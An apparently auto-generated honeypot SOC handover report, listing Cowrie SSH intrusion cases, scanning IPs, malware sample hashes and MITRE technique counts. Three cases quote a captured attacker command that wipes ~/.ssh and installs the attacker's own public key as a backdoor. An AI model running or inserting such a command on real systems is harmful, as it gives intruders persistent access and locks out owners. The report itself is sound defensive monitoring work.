| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 12:56:45` | `cowrie.session.connect` |
| `2026-04-02 12:56:45` | `cowrie.client.version` |
| `2026-04-02 12:56:45` | `cowrie.client.kex` |
| `2026-04-02 12:56:45` | `cowrie.login.success` |
| `2026-04-02 12:56:46` | `cowrie.session.params` |
| `2026-04-02 12:56:46` | `cowrie.command.input` |
| `2026-04-02 12:56:46` | `cowrie.command.failed` |
| `2026-04-02 12:56:46` | `cowrie.log.closed` |
| `2026-04-02 12:56:46` | `cowrie.session.params` |
| `2026-04-02 12:56:46` | `cowrie.command.input` |
| `2026-04-02 12:56:46` | `cowrie.session.file_download` |
| `2026-04-02 12:56:46` | `cowrie.log.closed` |
| `2026-04-02 12:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.156.221[.]46` to AbuseIPDB if not already reported
- [ ] Block `94.156.221[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab0ab04612f7

| Field | Detail |
|---|---|
| **Source IP** | `94.156.221[.]46` |
| **First Seen** | 2026-04-02 12:56 |
| **Last Seen** | 2026-04-02 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 12:56:49` | `cowrie.session.connect` |
| `2026-04-02 12:56:49` | `cowrie.client.version` |
| `2026-04-02 12:56:49` | `cowrie.client.kex` |
| `2026-04-02 12:56:50` | `cowrie.login.success` |
| `2026-04-02 12:56:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.156.221[.]46` to AbuseIPDB if not already reported
- [ ] Block `94.156.221[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce1a911eccf1

| Field | Detail |
|---|---|
| **Source IP** | `94.156.221[.]46` |
| **First Seen** | 2026-04-02 12:59 |
| **Last Seen** | 2026-04-02 12:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 12:59:46` | `cowrie.session.connect` |
| `2026-04-02 12:59:46` | `cowrie.client.version` |
| `2026-04-02 12:59:46` | `cowrie.client.kex` |
| `2026-04-02 12:59:47` | `cowrie.login.success` |
| `2026-04-02 12:59:47` | `cowrie.session.params` |
| `2026-04-02 12:59:47` | `cowrie.command.input` |
| `2026-04-02 12:59:47` | `cowrie.command.failed` |
| `2026-04-02 12:59:47` | `cowrie.log.closed` |
| `2026-04-02 12:59:47` | `cowrie.session.params` |
| `2026-04-02 12:59:47` | `cowrie.command.input` |
| `2026-04-02 12:59:48` | `cowrie.session.file_download` |
| `2026-04-02 12:59:48` | `cowrie.log.closed` |
| `2026-04-02 12:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.156.221[.]46` to AbuseIPDB if not already reported
- [ ] Block `94.156.221[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8ab21d4ff6a

| Field | Detail |
|---|---|
| **Source IP** | `94.156.221[.]46` |
| **First Seen** | 2026-04-02 12:59 |
| **Last Seen** | 2026-04-02 12:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 12:59:50` | `cowrie.session.connect` |
| `2026-04-02 12:59:50` | `cowrie.client.version` |
| `2026-04-02 12:59:50` | `cowrie.client.kex` |
| `2026-04-02 12:59:51` | `cowrie.login.success` |
| `2026-04-02 12:59:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.156.221[.]46` to AbuseIPDB if not already reported
- [ ] Block `94.156.221[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ce208478a3a

| Field | Detail |
|---|---|
| **Source IP** | `94.156.221[.]46` |
| **First Seen** | 2026-04-02 13:02 |
| **Last Seen** | 2026-04-02 13:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 13:02:50` | `cowrie.session.connect` |
| `2026-04-02 13:02:50` | `cowrie.client.version` |
| `2026-04-02 13:02:50` | `cowrie.client.kex` |
| `2026-04-02 13:02:51` | `cowrie.login.success` |
| `2026-04-02 13:02:51` | `cowrie.session.params` |
| `2026-04-02 13:02:51` | `cowrie.command.input` |
| `2026-04-02 13:02:51` | `cowrie.command.failed` |
| `2026-04-02 13:02:51` | `cowrie.log.closed` |
| `2026-04-02 13:02:52` | `cowrie.session.params` |
| `2026-04-02 13:02:52` | `cowrie.command.input` |
| `2026-04-02 13:02:52` | `cowrie.session.file_download` |
| `2026-04-02 13:02:52` | `cowrie.log.closed` |
| `2026-04-02 13:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.156.221[.]46` to AbuseIPDB if not already reported
- [ ] Block `94.156.221[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-652e4522fa6e

| Field | Detail |
|---|---|
| **Source IP** | `94.156.221[.]46` |
| **First Seen** | 2026-04-02 13:02 |
| **Last Seen** | 2026-04-02 13:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-02 13:02:54` | `cowrie.session.connect` |
| `2026-04-02 13:02:54` | `cowrie.client.version` |
| `2026-04-02 13:02:54` | `cowrie.client.kex` |
| `2026-04-02 13:02:55` | `cowrie.login.success` |
| `2026-04-02 13:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.156.221[.]46` to AbuseIPDB if not already reported
- [ ] Block `94.156.221[.]46` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `3.129.187[.]38` | **7** | 2026-04-02 12:21 | 2026-04-02 12:23 | 0m | 6 | `T1110.001` | 🟢 LOW |
| `94.156.221[.]46` | **4** | 2026-04-02 12:05 | 2026-04-02 13:02 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `20.64.97[.]136` | **2** | 2026-04-02 12:42 | 2026-04-02 12:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.48.170[.]235` | **2** | 2026-04-02 12:17 | 2026-04-02 12:18 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.47.156[.]170` | 1 | 2026-04-02 12:25 | 2026-04-02 12:25 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.211.219[.]58` | 1 | 2026-04-02 11:29 | 2026-04-02 11:29 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `118.45.101[.]159` | 1 | 2026-04-02 12:58 | 2026-04-02 12:58 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.178[.]142` | 1 | 2026-04-02 12:30 | 2026-04-02 12:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.60[.]44` | 1 | 2026-04-02 12:26 | 2026-04-02 12:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.202.198[.]98` | 1 | 2026-04-02 12:04 | 2026-04-02 12:04 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.48.112[.]8` | 1 | 2026-04-02 11:23 | 2026-04-02 11:23 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.49.166[.]131` | 1 | 2026-04-02 12:00 | 2026-04-02 12:00 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `150.246.249[.]149` | 1 | 2026-04-02 12:11 | 2026-04-02 12:12 | 31s | 0 | `T1592` | 🟢 LOW |
| `172.172.131[.]149` | 1 | 2026-04-02 12:36 | 2026-04-02 12:36 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.109.153[.]175` | 1 | 2026-04-02 12:19 | 2026-04-02 12:19 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.145[.]55` | 1 | 2026-04-02 11:24 | 2026-04-02 11:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `196.28.226[.]66` | 1 | 2026-04-02 10:58 | 2026-04-02 10:58 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.243.119[.]131` | 1 | 2026-04-02 11:59 | 2026-04-02 11:59 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `209.97.168[.]111` | 1 | 2026-04-02 10:51 | 2026-04-02 10:51 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.238.237[.]254` | 1 | 2026-04-02 12:57 | 2026-04-02 12:58 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `218.21.243[.]58` | 1 | 2026-04-02 12:24 | 2026-04-02 12:24 | 8s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `3.80.27[.]62` | 1 | 2026-04-02 12:55 | 2026-04-02 12:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.50.167[.]81` | 1 | 2026-04-02 11:04 | 2026-04-02 11:05 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.151[.]24` | 1 | 2026-04-02 11:44 | 2026-04-02 11:44 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `51.83.68[.]69` | 1 | 2026-04-02 11:38 | 2026-04-02 11:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.222.244[.]226` | 1 | 2026-04-02 12:24 | 2026-04-02 12:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `65.20.204[.]131` | 1 | 2026-04-02 10:59 | 2026-04-02 10:59 | 10s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `72.200.36[.]244` | 1 | 2026-04-02 11:00 | 2026-04-02 11:01 | 31s | 0 | `T1592` | 🟢 LOW |
| `90.161.217[.]228` | 1 | 2026-04-02 12:56 | 2026-04-02 12:58 | 120s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `90.230.115[.]5` | 1 | 2026-04-02 11:41 | 2026-04-02 11:41 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **29/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `90.161.217[.]228` | ES | Orange Espagne SA | **100** ⚠️ | 50 |
| `196.28.226[.]66` | MZ | TMCEL - Moçambique Telecom, SA | **100** ⚠️ | 50 |
| `201.243.119[.]131` | VE | CANTV Servicios, Venezuela | **100** ⚠️ | 18 |
| `183.171.145[.]55` | MY | Celcom Axiata Berhad | **100** ⚠️ | 6 |
| `150.246.249[.]149` | JP | So-net Service | **100** ⚠️ | 50 |
| `120.48.60[.]44` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 40 |
| `90.230.115[.]5` | SE | Telia Network Services | **100** ⚠️ | 10 |
| `172.172.131[.]149` | US | Microsoft Limited | **100** ⚠️ | 22 |
| `49.124.151[.]24` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 17 |
| `3.80.27[.]62` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 17 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 47 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 24 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 16 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 8 |

---

## 🔕 False Positive Summary (66 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 6 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 58 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 123 cases |
| Tool 34  | Credential Extractor        | ✅ 44 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 39 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 66 filtered (53.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 28 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 16 priority case(s) shown individually · 30 recon entry/entries in table (4 group(s) consolidating 15 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-02T13:08:44Z_
